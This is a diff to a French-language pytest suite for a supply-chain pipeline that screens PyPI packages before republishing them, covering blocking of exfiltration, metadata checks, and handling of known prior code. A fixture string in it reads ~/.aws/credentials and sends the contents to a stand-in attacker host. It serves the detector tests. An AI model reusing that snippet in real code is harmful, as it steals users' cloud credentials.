@@ -1,11 +1,14 @@
 """Boucle de traitement (B, point H3) : en_attente mûre → analyse → verdict → publication."""
+import io
 import sys
+import tarfile
+import zipfile
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
 
 import pytest
 
-from commun.modeles import Ecosysteme, Etat, RapportSandbox, Version
+from commun.modeles import Ecosysteme, Etat, Niveau, RapportSandbox, Signal, Source, Version
 from plateforme.db.acces import Base
 from plateforme.pipeline import traitement
 
@@ -28,17 +31,33 @@ def base(tmp_path):
     return b
 
 
+# Code des archives écrites par le faux PyPI (jamais exécuté) ; par défaut, un paquet sain.
+PIEGE = ("import os, urllib.request\n"
+         "d = open(os.path.expanduser('~/.aws/credentials')).read()\n"
+         "urllib.request.urlopen('https://collecte.attaquant-demo.invalid/c', d.encode())\n")
+CODE = {"piege": PIEGE}
+
+
+def ecrire_archives(dossier: Path, nom: str, version: str) -> None:
+    dossier.mkdir(parents=True, exist_ok=True)
+    with zipfile.ZipFile(dossier / f"{nom}-{version}-py3-none-any.whl", "w") as z:
+        z.writestr(f"{nom}/__init__.py", CODE.get(nom, "X = 1\n"))
+    with tarfile.open(dossier / f"{nom}-{version}.tar.gz", "w:gz") as t:
+        donnees = b"from setuptools import setup\nsetup()\n"
+        info = tarfile.TarInfo(f"{nom}-{version}/setup.py")
+        info.size = len(donnees)
+        t.addfile(info, io.BytesIO(donnees))
+
+
 @pytest.fixture
 def faux(tmp_path):
     """Faux de PyPI (B), de la sandbox et de la signature (C), qui notent leurs appels."""
-    appels = {"executer": [], "publier": [], "veiller": []}
+    appels = {"executer": [], "publier": [], "veiller": [], "meta": []}
 
     def telecharger(nom, version, dossier):
         if nom == "casse":
             raise ValueError("sha256 différent")
-        dossier.mkdir(parents=True, exist_ok=True)
-        (dossier / f"{nom}-{version}.tar.gz").write_bytes(b"x")
-        (dossier / f"{nom}-{version}-py3-none-any.whl").write_bytes(b"x")
+        ecrire_archives(dossier, nom, version)
         return sorted(dossier.iterdir())
 
     def executer(eco, archive, module, duree_max_s=120):
@@ -51,8 +70,12 @@ def faux(tmp_path):
     def veiller(base, maintenant):
         appels["veiller"].append(maintenant)
 
+    def controler_meta(v, precedente, maintenant):
+        appels["meta"].append((v.nom, v.version, precedente))
+        return []
+
     return dict(dossier=tmp_path / "archives", telecharger=telecharger, executer=executer,
-                publier=publier, veiller=veiller), appels
+                publier=publier, veiller=veiller, controler_meta=controler_meta), appels
 
 
 def etat(base, nom):
@@ -198,3 +221,57 @@ def test_une_veille_en_erreur_n_empeche_pas_le_traitement(base, faux):
 
     resultats = traitement.traiter(base, MAINTENANT, **{**deps, "veiller": veiller})
     assert [(v.nom, e) for v, e in resultats] == [("mure", Etat.PUBLIEE)]
+
+
+# --- Analyse statique du code et des métadonnées dans le parcours (M1) ---
+
+def test_un_paquet_qui_lit_un_secret_et_l_envoie_est_bloque_avec_sa_preuve(base, faux):
+    deps, appels = faux
+    base.enregistrer_version(version("piege", 10))
+    resultats = dict((v.nom, e) for v, e in traitement.traiter(base, MAINTENANT, **deps))
+    assert resultats["piege"] is Etat.BLOQUEE
+    fiche = base.fiche(Ecosysteme.PYPI, "piege", "1.0")
+    [s] = [s for s in fiche.signaux if s.sorte == "exfiltration"]
+    assert s.preuve["fichier"] == "piege/__init__.py" and "urlopen" in s.preuve["extrait"]
+    assert [p[0] for p in appels["publier"]] == ["mure"]
+
+
+def test_les_metadonnees_sont_controlees_avec_la_version_precedente(base, faux, tmp_path):
+    deps, appels = faux
+    for v, e in [("0.7", Etat.PUBLIEE), ("0.8", Etat.BLOQUEE), ("0.9", Etat.PUBLIEE),
+                 ("2.0", Etat.PUBLIEE)]:
+        base.enregistrer_version(Version(ecosysteme=Ecosysteme.PYPI, nom="mure", version=v,
+                                         publiee_le=MAINTENANT - timedelta(days=30),
+                                         detectee_le=MAINTENANT, etat=e))
+    traitement.traiter(base, MAINTENANT, **deps)
+    assert appels["meta"] == [("mure", "1.0", "0.9")]   # publiée, plus basse que 1.0, la plus haute
+
+
+def test_un_signal_des_metadonnees_arrive_sur_la_fiche(base, faux):
+    deps, _ = faux
+
+    def controler_meta(v, precedente, maintenant):
+        return [Signal(ecosysteme=v.ecosysteme, nom=v.nom, version=v.version,
+                       source=Source.STATIQUE, niveau=Niveau.MOYEN, sorte="projet_recent",
+                       preuve={"extrait": "projet publié il y a 3 jours"})]
+
+    traitement.traiter(base, MAINTENANT, **{**deps, "controler_meta": controler_meta})
+    fiche = base.fiche(Ecosysteme.PYPI, "mure", "1.0")
+    assert "projet_recent" in [s.sorte for s in fiche.signaux]
+    assert fiche.version.etat is Etat.PUBLIEE      # un indice MOYEN ne bloque pas
+
+
+def test_le_code_deja_present_dans_la_version_publiee_precedente_ne_compte_pas(base, faux):
+    deps, _ = faux
+    CODE["ancien"] = PIEGE
+    try:
+        base.enregistrer_version(Version(ecosysteme=Ecosysteme.PYPI, nom="ancien", version="0.9",
+                                         publiee_le=MAINTENANT - timedelta(days=30),
+                                         detectee_le=MAINTENANT, etat=Etat.PUBLIEE))
+        ecrire_archives(deps["dossier"] / "ancien" / "0.9", "ancien", "0.9")
+        base.enregistrer_version(version("ancien", 10))
+        traitement.traiter(base, MAINTENANT, **deps)
+    finally:
+        del CODE["ancien"]
+    fiche = base.fiche(Ecosysteme.PYPI, "ancien", "1.0")
+    assert "exfiltration" not in [s.sorte for s in fiche.signaux]
